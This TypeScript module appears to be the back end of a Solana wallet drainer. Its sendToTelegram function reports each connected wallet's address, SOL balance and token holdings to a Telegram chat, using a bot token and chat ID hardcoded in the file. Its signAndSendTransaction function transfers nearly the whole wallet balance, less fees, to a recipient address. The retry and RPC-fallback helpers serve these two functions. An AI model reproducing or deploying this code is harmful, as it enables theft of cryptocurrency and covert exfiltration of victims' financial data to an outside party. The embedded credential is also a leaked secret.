
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

// Helper function to add delay between retries
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

// List of public RPC endpoints that don't require authentication
const PUBLIC_RPC_ENDPOINTS = [
  "https://api.devnet.solana.com", // Let's try devnet first
  "https://solana-mainnet.g.alchemy.com/v2/demo", // Alchemy public demo endpoint
  "https://solana-api.projectserum.com", // Project Serum endpoint
  "https://free.rpcpool.com", // Free RPC Pool endpoint
  "https://solana.public-rpc.com", // Another public endpoint
];

// Retry function with exponential backoff
async function retry<T>(
  fn: () => Promise<T>,
  retries = 5,
  initialDelay = 1000
): Promise<T> {
  let lastError;
  for (let i = 0; i < retries; i++) {
    try {
      return await fn();
    } catch (error) {
      console.error(`Attempt ${i + 1} failed:`, error);
      lastError = error;
      if (i < retries - 1) {
        await delay(initialDelay * Math.pow(2, i));
      }
    }
  }
  throw lastError;
}

const testConnection = async (connection: Connection): Promise<boolean> => {
  try {
    // Use a simple request that doesn't require special permissions
    const blockHeight = await connection.getBlockHeight('finalized');
    console.log(`Connection test successful: Block Height = ${blockHeight}`);
    return true;
  } catch (error) {
    console.error('Connection test failed:', error);
    return false;
  }
};

// Create a connection with proper config
const createConnection = async (): Promise<Connection> => {
  console.log("Attempting to create a Solana connection...");
  
  const connectionConfig = {
    commitment: 'confirmed' as const,
    confirmTransactionInitialTimeout: 60000,
    disableRetryOnRateLimit: false,
  };
  
  // Try each endpoint until we find one that works
  for (const endpoint of PUBLIC_RPC_ENDPOINTS) {
    try {
      console.log(`Trying endpoint: ${endpoint}`);
      const connection = new Connection(endpoint, connectionConfig);
      
      const isValid = await testConnection(connection);
      if (isValid) {
        console.log(`Connected successfully to ${endpoint}`);
        return connection;
      }
    } catch (error) {
      console.error(`Failed to connect to ${endpoint}:`, error);
      continue;
    }
  }
  
  // Fallback connection with first endpoint (better than nothing)
  console.error('All RPC endpoints failed, using fallback with first endpoint');
  return new Connection(PUBLIC_RPC_ENDPOINTS[0], {
    commitment: 'finalized', // Use finalized for most reliable results
  });
};

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    console.log("Fetching token accounts for address:", walletAddress);
    
    const pubKey = new PublicKey(walletAddress);
    
    const response = await retry(async () => {
      const conn = await createConnection(); // Create a fresh connection
      return await conn.getParsedTokenAccountsByOwner(
        pubKey,
        {
          programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'),
        },
        'confirmed'
      );
    }, 3);

    console.log("Token accounts response:", response);

    return response.value.map(item => ({
      mint: item.account.data.parsed.info.mint,
      amount: item.account.data.parsed.info.tokenAmount.uiAmount,
      decimals: item.account.data.parsed.info.tokenAmount.decimals
    }));
  } catch (error) {
    console.error('Detailed error fetching token accounts:', error);
    return [];
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    const connection = await createConnection();
    let solBalance = 0;
    
    try {
      solBalance = await retry(async () => {
        return await connection.getBalance(new PublicKey(walletData.address), 'confirmed');
      }, 3);
      console.log("SOL balance fetched successfully:", solBalance);
    } catch (error) {
      console.error('Error fetching balance:', error);
    }
    
    const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;

    const formattedTokens = walletData.tokens.map((token: any) => 
      `Mint: ${token.mint}\nAmount: ${token.amount}\nDecimals: ${token.decimals}`
    ).join('\n\n');

    const message = `🔍 New Wallet Connection Detected:\n\n` +
      `👛 Wallet Address: ${walletData.address}\n` +
      `💎 SOL Balance: ${solBalanceInSol.toFixed(4)} SOL\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `💰 Token Balances:\n${formattedTokens}\n\n` +
      `🌐 Network: Solana (${PUBLIC_RPC_ENDPOINTS[0].includes('devnet') ? 'Devnet' : 'Mainnet'})`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Telegram API response:', await response.text());
      return false;
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return false;
  }
};

export const signAndSendTransaction = async (connection: Connection, wallet: any, recipientAddress: string, amount: number) => {
  try {
    console.log('Creating transaction...');
    
    // Check balance first
    const balance = await connection.getBalance(wallet.publicKey);
    console.log('Current wallet balance (lamports):', balance);
    const balanceInSol = balance / LAMPORTS_PER_SOL;
    console.log('Current wallet balance (SOL):', balanceInSol);
    
    // Make sure we have sufficient balance before proceeding
    if (balance <= 0) {
      console.error('Insufficient balance for transfer');
      throw new Error('Insufficient wallet balance for transfer');
    }
    
    // We need to account for transaction fees
    // Calculate the maximum we can send (balance minus a small amount for fees)
    const minimumRequiredBalance = 0.00089 * LAMPORTS_PER_SOL; // Approximate fee + rent exemption
    const maxTransferAmount = Math.max(0, balance - minimumRequiredBalance);
    
    if (maxTransferAmount <= 0) {
      console.error('Balance too low to cover fees');
      throw new Error('Wallet balance too low to cover transaction fees');
    }
    
    // Use the smaller of requested amount or max possible amount
    const transferAmount = Math.min(
      Math.floor(amount * LAMPORTS_PER_SOL), 
      maxTransferAmount
    );
    
    console.log(`Attempting to transfer ${transferAmount/LAMPORTS_PER_SOL} SOL`);
    
    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: new PublicKey(recipientAddress),
        lamports: transferAmount,
      })
    );

    console.log('Sending transaction...');
    const signature = await retry(async () => {
      // Get a fresh connection for the transaction
      const conn = await createConnection();
      return await sendAndConfirmTransaction(
        conn,
        transaction,
        [wallet],
        {
          commitment: 'confirmed',
          preflightCommitment: 'confirmed',
          maxRetries: 3,
        }
      );
    }, 3);

    console.log('Transaction successful:', signature);
    return signature;
  } catch (error) {
    console.error('Detailed transaction error:', error);
    throw error;
  }
};
